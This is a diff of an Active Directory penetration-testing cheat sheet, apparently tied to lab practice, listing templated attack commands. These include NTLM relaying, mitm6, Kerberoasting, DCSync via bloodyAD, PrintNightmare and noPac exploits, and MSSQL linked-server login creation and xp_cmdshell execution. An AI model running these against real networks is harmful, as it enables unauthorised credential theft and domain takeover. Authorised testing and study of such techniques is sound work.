@@ -3,7 +3,6 @@
 *   [KB Realm Configuration](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
     *   `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]` → Repeat for every domain
     *   `krbconf()     [DOMAIN] [DC_NETBIOS_NAME]`                     → [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
-    *   `sudo rdate -n [DC_HOSTNAME]` 
 *   Authentication
     *   Password
         *   NXC           → `-u [USER] -p [PASS] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
@@ -67,6 +66,7 @@
         *   Data Access
             *   SMBClient Native         → `smbclient \\\\[IP]\\[SHARE] [-U [USER%PASS]]`
             *   Impacket Client            → `smbclient.py [AUTH_STRING]` → `help` / `shares`
+            *   Upload Files                   → `put [SRC]`
             *   Recursive Download   → `nxc smb [IP] [AUTH_STRING] -M spider_plus -o DOWNLOAD_FLAG=True`
             *   Single Download          → `nxc smb [IP] [AUTH_STRING] --get-file '[FILE]' [OUT] --share "[SHARE]"`
             *   Local Mounting            → `mount -t cifs -o "username=[USER]" //[IP]/[SHARE] /mnt/[SHARE]`
@@ -90,54 +90,57 @@
         *   `nxc smb  [IP] [AUTH_STRING] -M gpp_password`
         *   `nxc smb  [IP] [AUTH_STRING] --laps`
         *   `nxc ldap [DC_IP] [AUTH_STRING] --gmsa`
-    *   SMB Exploits
+    *   SCCM Abuse
+        *   `sccmhunter.py smb -u [USER] -p [PASS] -d [DOMAIN] -dc-ip [DC_IP] -save`
+        *   `sccmhunter.py show -all`
+        *   [Admin Hunting](https://www.thehacker.recipes/ad/movement/sccm-mecm/lateral-movement)
+        *   [Other Exploits](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)
+    *   DC Exploits
         *   `scan() smb [IP] [PORT]` → Exploit Research
         *   `nxc smb [IP] [AUTH_STRING] -M printnightmare -M spooler -M zerologon -M nopac -M smbghost -M ms17-010`
         *   [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) → `CVE-2021-1675.py [AUTH_STRING] '\\[KALI_IP]\Share\[EVIL.dll]'` → MSFVenom / [AddUser Cross-Compile](https://github.com/newsoft/adduser)
         *   [NoPAC](https://github.com/Ridter/noPac.git)                  → `noPac.py [AUTH_STRING] --impersonate administrator -use-ldap -dump`
         *   MS17-010                → `use exploit/windows/smb/ms17_010_psexec`
+        *   [MS14-068](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/MS14-068.md)             → Missing `KB3011780`
+        *   [PrivExchange](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/PrivExchange/)     → User Shell with Exchange Mailbox
         *   [ZeroLogon](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/ZeroLogon/)
         *   SMBGhost
     *   NTLM Poisoning
         *   LLMNR
             *   `respond()`
-            *   RFI / XXE / SSRF / [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft) / MSSQL
+            *   Web Exploits                      → LFI / XXE / SSRF / SQLi
             *   Phishing / Client Forms  → Responder Link / Bad-PDF / [NTLM\_Thef](https://github.com/Greenwolf/ntlm_theft) Office Files
             *   Cracking                              → `hashcat -m 5600`
         *   Unsigned Relaying
-            *   `respond()` → HTTP/SMB = Off
-            *   `nxc smb [ALIVE_IPS] --gen-relay-list [OUT_FILE]`
-            *   `MultiRelay.py -t [UNSIGNED_IP] -u ALL -d`
-            *   `ntlmrelayx --no-http-server -smb2support -t [UNSIGNED_IP]`
+            *   `respond()`                                                                              → Set `HTTP/SMB = Off`
+            *   `nxc smb [ALIVE_IPS] --gen-relay-list [OUT_FILE]` → List Vulnerable Servers
+            *   `MultiRelay.py -t [VULN_SERVER_IP] -u ALL -d`
+            *   `ntlmrelayx --no-http-server -smb2support -t [VULN_SERVER_IP]`
         *   DHCPv6 Takeover
             *   `sudo mitm6 -I [NIC] -d [DOMAIN]`
             *   `ntlmrelayx.py -6 -wh fakewpad.[DOMAIN] -t ldap://[DC_IP]:[PORT]`
-        *   DC Coercion
-            *   `respond()`
-            *   `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus -o LISTENER=[RESPONDER_IP] ALWAYS=true`    
-            *   [PrivExchange](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/PrivExchange/) → User with Exchange Mailbox
-    *   SCCM Abuse
-        *   `sccmhunter.py smb -u [USER] -p [PASS] -d [DOMAIN] -dc-ip [DC_IP] -save`
-        *   `sccmhunter.py show -all`
-        *   [Exploitation](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)
-        *   [Admin Hunting](https://www.thehacker.recipes/ad/movement/sccm-mecm/lateral-movement)
+        *   NTLM Coercion
+            *   Check → `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus`
+            *   Exploitation
+                *   `respond()` / NTLMRelayx Listener
+                *   `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus -o LISTENER=[RESPONDER_IP]` 
 *   LDAP
     *   User Enumeration
-        *   LDAP Query         → `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
-        *   KB Bruteforcing  → `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP] -d [DOMAIN]`
-        *   Full DB Dump     → `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → [Data Parsing](https://github.com/franc-pentest/ldeep)
+        *   `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
+        *   `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → Full DB Dump + [Output Parsing](https://github.com/franc-pentest/ldeep)
+        *   KB Bruteforcing
+            *   Generate Users → `usergen() [FULL_NAMES.txt]` / [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) / Seclists Xato-Net + `Names.txt`
+            *   `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP] -d [DOMAIN]`
     *   Domain Roasting
-        *   [Clock Sync](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-tricks/#kerberos-clock-synchronization)
-            *   `sudo timedatectl set-ntp off`
-            *   `sudo rdate -n [DC_IP]`
         *   ASREP
+            *   Try Both Techniques
             *   `nxc ldap [DC_IP] -u [VALID_USERS.txt] -p '' --asreproast --kdcHost [DOMAIN]`
             *   `nxc ldap [DC_IP] [AUTH_STRING] --asreproast --kdcHost [DOMAIN]`
             *   Cracking → `hashcat -m 18200`
         *   KBR
+            *   Try Both Techniques
             *   `nxc ldap              [DC_IP] [AUTH_STRING] --kerberoasting --kdcHost [DOMAIN]`
             *   `GetUserSPNs.py        [DOMAIN]/ -no-preauth [ASREP_USERNAME] -usersfile [VALID_USERS.txt] -dc-ip [DC_IP]`
-            *   `targetedKerberoast.py [AUTH_STRING] -dc-ip [DC_IP] -d [DOMAIN]`
             *   Cracking → `hashcat -m 13100`
     *   Certificate Abuse
         *   [ESC Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
@@ -174,8 +177,12 @@
     *   [DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
         *   Enumeration
             *   `bloodhound-python -u [USER] -p [PASS] [--hashes HASH] -ns [DC_IP] -d [DOMAIN] -c all --zip [--dns-tcp]`
-            *   Mark Owned + Outbound Controls / Shortest Paths + Abuse Functions
+            *   Errors                          → Select Individual Collection Methods / Attempt Blind Exploitation
+            *   Mark Owned Users → Check Outbound Controls / All Shortest Paths → Exploit Privilege
         *   Exploitation
+            *   Targeted Roasting
+                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add uac [USER] -f DONT_REQ_PREAUTH`
+                *   `targetedKerberoast.py [AUTH_STRING] -dc-ip [DC_IP] -d [DOMAIN]`
             *   Set Ownership
                 *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set owner "[OBJECT]" "[USER]"`
             *   Set GenericAll / FullControl
@@ -187,8 +194,6 @@
                 *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set password "[TARGET_USER]" "[PASS]"`
             *   Add Group Member
                 *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add groupMember "[GROUP]" “[USER]”`
-            *   Targeted ASREPRoast
-                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add uac [USER] -f DONT_REQ_PREAUTH`
             *   Set DCSync
                 *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add dcsync "[USER]"`
                 *   `secretsdumpy.py [AUTH_STRING]` → On DC
@@ -212,24 +217,23 @@
         *   Cracking        → `hashcat -m 5600`
         *   Service Hash → Impersonate Administrator + RCE
     *   User Impersonation
+        *   `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
+        *   `EXECUTE AS LOGIN = '[PRIVILEGED_USER]'`
         *   NXC
             *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv`
             *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv -o ACTION=privesc`
-            *   `nxc mssql [IP] [AUTH_STRING] -q '[MSSQL_QUERY]'`
-        *   Manual
-            *   `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
-            *   `EXECUTE AS LOGIN = '[PRIVILEGED_USER]'`
-    *   OS Read / Upload
-        *   Download              → `nxc mssql [IP] [AUTH_STRING] --get-file C:\\[SRC] [OUT]`
-        *   Upload                    → `nxc mssql [IP] [AUTH_STRING] --put-file [SRC] C:\\Windows\\Temp\\[OUT]`
+            *   `nxc mssql [IP] [AUTH_STRING] -q ‘[MSSQL_QUERY]’`
+    *   OS Read
+        *   Download               → `nxc mssql [IP] [AUTH_STRING] --get-file C:\\[SRC] [OUT]`
         *   Directory Listing   → `EXEC master..xp_dirtree [OS_DIR]`
         *   File Read                 → `SELECT * FROM OPENROWSET(BULK N'[PATH\\TO\\FILE]', SINGLE_CLOB) AS Contents`
     *   Linked Instances
-        *   `SELECT * FROM master..sysservers;` → Check if `IsRemote = 0`
-        *   `EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = password'') AT [[INSTANCE]]`
-        *   `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[INSTANCE]]`
+        *   `SELECT * FROM master..sysservers;` → Check Instances with `IsRemote = 0`
         *   `EXECUTE('[MSSQL_QUERY]') AT [[INSTANCE]]`
-    *   RCE (Admin)
-        *   `enable_xp_cmdshell`
-        *   `xp_cmdshell [CMD]` 
-        *   NXC → `nxc mssql [IP] [AUTH_STRING] -x/X [CMD/PS_COMMAND]`
+        *   Queries
+            *   `EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = password'') AT [[INSTANCE]]`
+            *   `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[INSTANCE]]`
+    *   RCE / File Upload (Admin)
+        *   `enable_xp_cmdshell` → `xp_cmdshell [CMD]` 
+        *   `nxc mssql [IP] [AUTH_STRING] --put-file [SRC] C:\\Windows\\Temp\\[OUT]`
+        *   `nxc mssql [IP] [AUTH_STRING] [-x/-X] [CMD/PS_COMMAND]`
